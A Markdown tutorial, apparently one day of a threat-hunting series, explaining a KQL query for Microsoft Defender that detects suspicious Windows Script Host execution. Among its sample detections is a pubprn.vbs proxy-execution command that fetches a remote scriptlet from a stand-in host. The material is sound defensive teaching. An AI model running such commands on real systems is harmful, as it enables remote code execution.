@@ -1,0 +1,350 @@
+````markdown
+# Day 5 — Suspicious Windows Script Host Execution
+
+Day 5 moves from PowerShell into Windows Script Host by looking for potentially suspicious use of `wscript.exe` and `cscript.exe`.
+
+This remains a single-table query using `DeviceProcessEvents`, but introduces script-type extraction, parent-process context and location-based categorisation.
+
+---
+
+## Objective
+
+Identify Windows Script Host processes executing VBScript, JavaScript or Windows Script Files from potentially suspicious locations or through unusual parent processes.
+
+Examples may include:
+
+```text
+wscript.exe C:\Users\User\Downloads\invoice.vbs
+```
+
+```text
+cscript.exe C:\Users\User\AppData\Local\Temp\update.js
+```
+
+```text
+winword.exe
+    └── wscript.exe payload.vbs
+```
+
+```text
+msedge.exe
+    └── cscript.exe downloaded_script.js
+```
+
+Windows Script Host is a legitimate Windows component used to execute scripts.
+
+Attackers may abuse it to run scripts delivered through phishing, downloads, malicious documents or other initial-access methods.
+
+---
+
+## Data Source
+
+This query uses:
+
+- `DeviceProcessEvents`
+
+The table contains process creation and command-line telemetry from Microsoft Defender for Endpoint.
+
+---
+
+## MITRE ATT&CK
+
+- **T1059 — Command and Scripting Interpreter**
+- **T1059.005 — Visual Basic**
+- **T1059.007 — JavaScript**
+
+Additional techniques may apply depending on how the script was delivered and what it executes.
+
+---
+
+## KQL Concepts
+
+Day 5 introduces or reinforces:
+
+- `let`
+- `dynamic`
+- `where`
+- `in~`
+- `tolower()`
+- `extract()`
+- `case()`
+- `contains`
+- `isnotempty()`
+- Boolean conditions
+- `project`
+- `order by`
+
+The main focus is extracting the script extension from the command line and using several pieces of context to explain why the execution may require review.
+
+---
+
+## KQL Query
+
+```kql
+// Day 5 - Suspicious Windows Script Host Execution
+// Identifies wscript.exe and cscript.exe executing scripts
+// from writable locations, remote references or user-facing applications.
+
+let Lookback = 7d;
+
+let ScriptHosts = dynamic([
+    "wscript.exe",
+    "cscript.exe"
+]);
+
+let UserFacingParentProcesses = dynamic([
+    "winword.exe",
+    "excel.exe",
+    "powerpnt.exe",
+    "outlook.exe",
+    "onenote.exe",
+    "msaccess.exe",
+    "mspub.exe",
+    "visio.exe",
+    "acrord32.exe",
+    "chrome.exe",
+    "msedge.exe",
+    "firefox.exe",
+    "iexplore.exe",
+    "7zfm.exe",
+    "winrar.exe"
+]);
+
+DeviceProcessEvents
+| where Timestamp >= ago(Lookback)
+| where FileName in~ (ScriptHosts)
+| extend NormalisedCommandLine = tolower(ProcessCommandLine)
+| extend ScriptExtension = extract(
+    @"\.(vbs|vbe|js|jse|wsf|wsh)(?:\s|""|$)",
+    1,
+    NormalisedCommandLine
+)
+| extend ScriptType = case(
+    ScriptExtension in ("vbs", "vbe"),
+        "VBScript",
+    ScriptExtension in ("js", "jse"),
+        "JavaScript",
+    ScriptExtension in ("wsf", "wsh"),
+        "Windows Script File",
+    "Unidentified"
+)
+| extend ScriptLocation = case(
+    NormalisedCommandLine contains "\\appdata\\local\\temp\\",
+        "User temporary directory",
+    NormalisedCommandLine contains "\\windows\\temp\\",
+        "Windows temporary directory",
+    NormalisedCommandLine contains "\\downloads\\",
+        "Downloads directory",
+    NormalisedCommandLine contains "\\users\\public\\",
+        "Public user directory",
+    NormalisedCommandLine contains "\\appdata\\roaming\\",
+        "User roaming profile",
+    NormalisedCommandLine contains "\\programdata\\",
+        "ProgramData directory",
+    "Other or unresolved"
+)
+| extend HasRemoteReference =
+    NormalisedCommandLine contains "http://"
+    or NormalisedCommandLine contains "https://"
+    or NormalisedCommandLine contains "script:"
+| extend HasUserFacingParent =
+    InitiatingProcessFileName in~ (UserFacingParentProcesses)
+| where ScriptLocation != "Other or unresolved"
+    or HasRemoteReference
+    or HasUserFacingParent
+| extend DetectionReason = case(
+    HasRemoteReference,
+        "Script host command contains a remote reference",
+    HasUserFacingParent and ScriptLocation != "Other or unresolved",
+        "User-facing application launched a script from a writable location",
+    HasUserFacingParent,
+        "User-facing application launched Windows Script Host",
+    ScriptLocation != "Other or unresolved",
+        "Script executed from a writable or temporary location",
+    "Windows Script Host activity requiring review"
+)
+| project
+    Timestamp,
+    DeviceName,
+    AccountName,
+    InitiatingProcessFileName,
+    FileName,
+    ScriptType,
+    ScriptExtension,
+    ScriptLocation,
+    DetectionReason,
+    ProcessCommandLine,
+    FolderPath,
+    SHA1,
+    ProcessId,
+    ProcessUniqueId,
+    InitiatingProcessId,
+    InitiatingProcessUniqueId,
+    DeviceId,
+    ReportId
+| order by Timestamp desc
+```
+
+---
+
+## How the Query Works
+
+The query begins by limiting the results to the two primary Windows Script Host executables:
+
+```kql
+| where FileName in~ (ScriptHosts)
+```
+
+These are:
+
+- `wscript.exe`, which normally runs scripts through the Windows graphical environment
+- `cscript.exe`, which normally runs scripts through the command-line environment
+
+The command line is converted to lowercase so that later comparisons remain consistent:
+
+```kql
+| extend NormalisedCommandLine = tolower(ProcessCommandLine)
+```
+
+The `extract()` function then searches the command line for a recognised script extension:
+
+```kql
+| extend ScriptExtension = extract(
+    @"\.(vbs|vbe|js|jse|wsf|wsh)(?:\s|""|$)",
+    1,
+    NormalisedCommandLine
+)
+```
+
+The extracted extension is assigned to one of three script categories:
+
+| Extension | Script type |
+|---|---|
+| `.vbs`, `.vbe` | VBScript |
+| `.js`, `.jse` | JavaScript |
+| `.wsf`, `.wsh` | Windows Script File |
+
+If no supported extension can be identified, the result is categorised as `Unidentified`.
+
+The query then checks whether the command line references a location commonly used to store downloaded, temporary or user-controlled content.
+
+It also checks whether the script host was launched by a user-facing application such as:
+
+- Microsoft Office
+- Outlook
+- A web browser
+- Adobe Reader
+- An archive utility
+
+Finally, the `DetectionReason` column explains which condition caused the event to be returned.
+
+---
+
+## Detection Categories
+
+| Observed behaviour | Detection reason |
+|---|---|
+| Command contains `http://`, `https://` or `script:` | Script host command contains a remote reference |
+| User-facing process launches a script from a writable location | User-facing application launched a script from a writable location |
+| User-facing process launches `wscript.exe` or `cscript.exe` | User-facing application launched Windows Script Host |
+| Script runs from a temporary or writable location | Script executed from a writable or temporary location |
+| Other matching activity | Windows Script Host activity requiring review |
+
+The categories are intended to provide investigation context.
+
+They should not be treated as severity ratings or confirmation that the script is malicious.
+
+---
+
+## Expected Results
+
+The query may identify activity such as:
+
+```text
+wscript.exe C:\Users\User\Downloads\invoice.vbs
+```
+
+```text
+cscript.exe C:\Users\User\AppData\Local\Temp\update.js
+```
+
+```text
+outlook.exe
+    └── wscript.exe C:\Users\User\AppData\Local\Temp\attachment.vbs
+```
+
+```text
+chrome.exe
+    └── cscript.exe C:\Users\User\Downloads\script.js
+```
+
+```text
+cscript.exe C:\Windows\System32\Printing_Admin_Scripts\pubprn.vbs script:https://example.test/payload.sct
+```
+
+Results should be reviewed alongside:
+
+- The complete script-host command line
+- The parent process
+- The user account
+- The script file and its hash
+- The origin of the script
+- Subsequent child processes
+- Related file and network activity
+
+---
+
+## Potential False Positives
+
+Legitimate results may include:
+
+- Administrative logon scripts
+- Software deployment
+- Device-management tools
+- Approved automation
+- Legacy business applications
+- Helpdesk troubleshooting
+- Printer administration scripts
+- Security testing
+- Scripts stored within user profiles
+- Internally developed VBScript or JavaScript tools
+
+Known legitimate script paths, filenames and parent-process relationships may be excluded after review.
+
+---
+
+## Limitations
+
+This query does not prove that the executed script is malicious.
+
+It may also miss:
+
+- Script hosts launched under renamed executables
+- Scripts without a recognised extension
+- Scripts stored outside the listed locations
+- Scripts executed through another interpreter
+- Obfuscated script paths
+- Script content held entirely in memory
+- Malicious activity performed by an otherwise trusted script
+
+The query examines the immediate initiating process only. It may not identify longer process chains where the user-facing application is a grandparent rather than the direct parent.
+
+---
+
+## References
+
+- [Microsoft Defender XDR — DeviceProcessEvents](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table)
+- [Microsoft Learn — extract()](https://learn.microsoft.com/en-us/kusto/query/extract-function)
+- [Microsoft Learn — contains](https://learn.microsoft.com/en-us/kusto/query/contains-operator)
+- [MITRE ATT&CK — T1059: Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
+- [MITRE ATT&CK — T1059.005: Visual Basic](https://attack.mitre.org/techniques/T1059/005/)
+- [MITRE ATT&CK — T1059.007: JavaScript](https://attack.mitre.org/techniques/T1059/007/)
+
+---
+
+## Disclaimer
+
+This query is intended for threat hunting, research and educational use.
+
+It should be tested and tuned against the target environment before being used as a production detection.
+````
